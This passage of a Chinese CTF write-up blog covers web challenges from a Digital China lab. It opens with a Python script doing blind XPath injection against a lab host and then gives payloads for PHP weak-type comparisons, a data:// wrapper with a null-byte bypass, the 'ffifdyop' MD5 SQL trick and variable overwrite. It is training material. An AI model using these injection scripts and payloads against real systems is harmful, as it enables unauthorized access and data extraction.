class="hljs-string">&quot;, 1)=&#x27;&quot;</span> + i + <span class="hljs-string">&quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>        url += payload<br>        b = requests.get(url=url)<br>        <span class="hljs-keyword">if</span> b.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>            genName += i<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根节点名称为<span class="hljs-subst">&#123;genName&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 根子节点数量</span><br>zi = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload = <span class="hljs-string">&quot;&#x27; or count(/&quot;</span> + genName + <span class="hljs-string">&quot;/*)=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    url += payload<br>    a = requests.get(url=url)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根子节点数量<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        zi = i<br><span class="hljs-comment"># 根节点子节点的长度和名称</span><br>a2 = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span><br>mc1 = <span class="hljs-string">&quot;&quot;</span><br>mc2 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, zi + <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>        url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>        payload = <span class="hljs-string">&quot;&#x27; or string-length(name(/&quot;</span> + genName + <span class="hljs-string">&quot;/*[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]))= &quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>        url += payload<br>        a = requests.get(url=url)<br>        <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;genName&#125;</span>的第<span class="hljs-subst">&#123;i&#125;</span>个子节点长度为<span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>            <span class="hljs-comment"># for ii in range(1, zi + 1):</span><br>            <span class="hljs-comment">#     for jj in range(1, j + 1):</span><br>            <span class="hljs-comment">#         for l in a2:</span><br>            <span class="hljs-comment">#             url = &quot;http://192.168.1.200:52580/?id=&quot;</span><br>            <span class="hljs-comment">#             payload = &quot;&#x27; or substring(name(/main/*[&quot; + str(ii) + &quot;]),&quot; + str(jj) + &quot;,1)=&#x27;&quot; + str(l) + &quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>            <span class="hljs-comment">#             url += payload</span><br>            <span class="hljs-comment">#             b = requests.get(url=url)</span><br>            <span class="hljs-comment">#             if b.text.find(&quot;good&quot;) &gt;= 1:</span><br>            <span class="hljs-comment">#                 print(l, end=&quot;&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第一个子节点名称为：user，第二个子节点名称为ctf&quot;</span>)<br>ctf = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload = <span class="hljs-string">&quot;&#x27; or string-length(name(/main/ctf/*[1]))=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    url += payload<br>    a = requests.get(url=url)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ctf第一个子节点长度为<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        ctf = i<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>):<br>            a = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> a:<br>                url1 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>                payload = <span class="hljs-string">&quot;&#x27; or substring(name(/main/ctf/*[2]),&quot;</span> + <span class="hljs-built_in">str</span>(ii) + <span class="hljs-string">&quot;,1)=&#x27;&quot;</span> + <span class="hljs-built_in">str</span>(jj) + <span class="hljs-string">&quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>                <span class="hljs-comment"># 这里的main还有另一个参数，为username,ctf/*[1]</span><br>                url1 += payload<br>                a2 = requests.get(url=url1)<br>                <span class="hljs-keyword">if</span> a2.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(jj, end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment"># http://192.168.1.200:52580/?id=&#x27; or count(/main/ctf[1]/username/*)=0 and &#x27;&#x27;=&#x27;</span><br><span class="hljs-comment"># 验证/main/的ctf中的username是否还有子节点，=0为无</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload = <span class="hljs-string">&quot;&#x27; or string-length(/main/ctf[1]/username[1])=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    url += payload<br>    a = requests.get(url=url)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        a1 = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm-.&#123;&#125;0123456789&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>            <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> a1:<br>                url1 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>                payload = <span class="hljs-string">&quot;&#x27; or substring((/main/ctf[1]/key[1]),&quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;,1)=&#x27;&quot;</span> + <span class="hljs-built_in">str</span>(ii) + <span class="hljs-string">&quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>                url1 += payload<br>                b = requests.get(url=url1)<br>                <span class="hljs-keyword">if</span> b.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(ii, end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></div></td></tr></table></figure>

<h2 id="17、WEB-luckynumber"><a href="#17、WEB-luckynumber" class="headerlink" title="17、WEB_luckynumber"></a>17、WEB_luckynumber</h2><p>这里有3页，结合标题的lucknumber，猜数字，直接拿burp跑就行了 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214236552.png" srcset="/img/loading.gif" lazyload alt="image-20241024214236552"></p>
<h2 id="18、WEB-bestphp"><a href="#18、WEB-bestphp" class="headerlink" title="18、WEB_bestphp"></a>18、WEB_bestphp</h2><p>3位大于999的字符串，科学计数法 <img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214255481.png" srcset="/img/loading.gif" lazyload alt="image-20241024214255481"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214301028.png" srcset="/img/loading.gif" lazyload alt="image-20241024214301028"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214310266.png" srcset="/img/loading.gif" lazyload alt="image-20241024214310266"></p>
<h2 id="19、WEB-robots"><a href="#19、WEB-robots" class="headerlink" title="19、WEB_robots"></a>19、WEB_robots</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214335166.png" srcset="/img/loading.gif" lazyload alt="image-20241024214335166"></p>
<p>这题吃了没文化的亏，卡半天 ，不过 这题目也挺离谱的哈哈哈哈</p>
<p>猜robots.php </p>
<p>瞎做 </p>
<p>useraget中添加GOOGLEBOT出现flag </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214350042.png" srcset="/img/loading.gif" lazyload alt="image-20241024214350042"></p>
<h2 id="20、WEB-pilipili"><a href="#20、WEB-pilipili" class="headerlink" title="20、WEB_pilipili"></a>20、WEB_pilipili</h2><p>进去也没法右键，ctrl+U打开源码，看到一个可疑JS文件，JS的eval加密，直接上在线平台解密，解出来flag错的。。还是靶机问题 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214423013.png" srcset="/img/loading.gif" lazyload alt="image-20241024214423013"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214429880.png" srcset="/img/loading.gif" lazyload alt="image-20241024214429880"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214437978.png" srcset="/img/loading.gif" lazyload alt="image-20241024214437978"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214446037.png" srcset="/img/loading.gif" lazyload alt="image-20241024214446037"></p>
<h2 id="21、WEB-welcome"><a href="#21、WEB-welcome" class="headerlink" title="21、WEB_welcome"></a>21、WEB_welcome</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214522971.png" srcset="/img/loading.gif" lazyload alt="image-20241024214522971"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214529391.png" srcset="/img/loading.gif" lazyload alt="image-20241024214529391"></p>
<p>打开404，头文件藏着，但是flag在这个靶场试错的，flag在&#x2F;目录 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214551289.png" srcset="/img/loading.gif" lazyload alt="image-20241024214551289"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214600445.png" srcset="/img/loading.gif" lazyload alt="image-20241024214600445"></p>
<h2 id="22、WEB-login-form"><a href="#22、WEB-login-form" class="headerlink" title="22、WEB_login_form"></a>22、WEB_login_form</h2><p>前边啥也没有，看看源码 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214621259.png" srcset="/img/loading.gif" lazyload alt="image-20241024214621259"></p>
<p>图片base64，解开是flag，但是提交错误。。 bug估计</p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214632124.png" srcset="/img/loading.gif" lazyload alt="image-20241024214632124"></p>
<h2 id="23、WEB-code"><a href="#23、WEB-code" class="headerlink" title="23、WEB_code"></a>23、WEB_code</h2><p>直接逆向 </p>
<p>echo hex2bin(strrev(bin2hex(base64_decode(“”)))); </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214703545.png" srcset="/img/loading.gif" lazyload alt="image-20241024214703545"></p>
<h2 id="24、WEB-workhard"><a href="#24、WEB-workhard" class="headerlink" title="24、WEB_workhard"></a>24、WEB_workhard</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214718998.png" srcset="/img/loading.gif" lazyload alt="image-20241024214718998"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214726641.png" srcset="/img/loading.gif" lazyload alt="image-20241024214726641"></p>
<p>题目代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>echo &quot;&lt;!--challenge3.txt--&gt;&quot;;<br>require __DIR__.&#x27;/lib.php&#x27;;<br>if(!$_GET[&#x27;id&#x27;])<br>&#123;<br>    header(&#x27;Location: challenge3.php?id=1&#x27;);<br>    exit();<br>&#125;<br>$id=$_GET[&#x27;id&#x27;];<br>$a=$_GET[&#x27;a&#x27;];<br>$b=$_GET[&#x27;b&#x27;];<br>if(stripos($a,&#x27;.&#x27;))<br>&#123;<br>    echo &#x27;Hahahahahaha&#x27;;<br>    return ;<br>&#125;<br>$data = @file_get_contents($a,&#x27;r&#x27;);<br>if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)<br>&#123;<br>    echo $flag;<br>&#125;<br>else<br>&#123;<br>    print &quot;work harder!harder!harder!&quot;;<br>&#125;<br><br>?&gt;<br><br></code></pre></div></td></tr></table></figure>

<p>data要等于指定字符串，id要等于0，长度要大于5，eregi检查是否存在指定内容，截取b的第一位拼接111是否在1114，截取b的第一位不能等于4 </p>
<p>data可以用data伪协议或者php伪协议的input，post传值 </p>
<p>id等于0，因为get直接传递字符型会被转为string类型，所以这里直接用string类型，弱类型比较就是0 </p>
<p>b的长度大于5，后面两个substr，直接%00绕过 </p>
<p>Payload </p>
<p>?id&#x3D;zhh&amp;data&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,xxx&amp;%00llllll </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214850175.png" srcset="/img/loading.gif" lazyload alt="image-20241024214850175"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214901291.png" srcset="/img/loading.gif" lazyload alt="image-20241024214901291"></p>
<h2 id="25、WEB-randnum"><a href="#25、WEB-randnum" class="headerlink" title="25、WEB_randnum"></a>25、WEB_randnum</h2><p>这里要大于5,184,000，也要小于7,776,000，如果输入太大的数，有个sleep，科学计数法 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214925010.png" srcset="/img/loading.gif" lazyload alt="image-20241024214925010"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214931121.png" srcset="/img/loading.gif" lazyload alt="image-20241024214931121"></p>
<p>等待6秒即可</p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214941515.png" srcset="/img/loading.gif" lazyload alt="image-20241024214941515"></p>
<h2 id="26、WEB-login-md5"><a href="#26、WEB-login-md5" class="headerlink" title="26、WEB_login_md5"></a>26、WEB_login_md5</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215354621.png" srcset="/img/loading.gif" lazyload alt="image-20241024215354621"></p>
<h2 id="27、WEB-mark-wc"><a href="#27、WEB-mark-wc" class="headerlink" title="27、WEB_mark_wc"></a>27、WEB_mark_wc</h2><p>git泄露 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215435738.png" srcset="/img/loading.gif" lazyload alt="image-20241024215435738"></p>
<p>查看代码，$$，变量覆盖， </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215445919.png" srcset="/img/loading.gif" lazyload alt="image-20241024215445919"></p>
<h2 id="28、web-md5-wc"><a href="#28、web-md5-wc" class="headerlink" title="28、web_md5_wc"></a>28、web_md5_wc</h2><p>ffifdyop绕过</p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215512802.png" srcset="/img/loading.gif" lazyload alt="image-20241024215512802"></p>
<p>2，直接查看源码，可以看到MD5弱类型，数组绕过后查看下一关 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215540379.png" srcset="/img/loading.gif" lazyload alt="image-20241024215540379"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215547119.png" srcset="/img/loading.gif" lazyload alt="image-20241024215547119"></p>
<p>这一关也是弱类型，直接数组绕过 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215603216.png" srcset="/img/loading.gif" lazyload alt="image-20241024215603216"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215613767.png" srcset="/img/loading.gif" lazyload alt="image-20241024215613767"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215623359.png" srcset="/img/loading.gif" lazyload alt="image-20241024215623359"></p>
<h2 id="29、web-bugsbunny"><a href="#29、web-bugsbunny" class="headerlink" title="29、web_bugsbunny"></a>29、web_bugsbunny</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215645366.png" srcset="/img/loading.gif" lazyload alt="image-20241024215645366"></p>
<p>又是变量覆盖，直接使用die函数，输出flag，这里需要post随便flag随便传个值绕过第二个if判断 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215658740.png" srcset="/img/loading.gif" lazyload alt="image-20241024215658740"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215704216.png" srcset="/img/loading.gif" lazyload alt="image-20241024215704216"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215711520.png" srcset="/img/loading.gif" lazyload alt="image-20241024215711520"></p>
<p>结束</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                  </div>
                
              </div>
              
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
    

  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
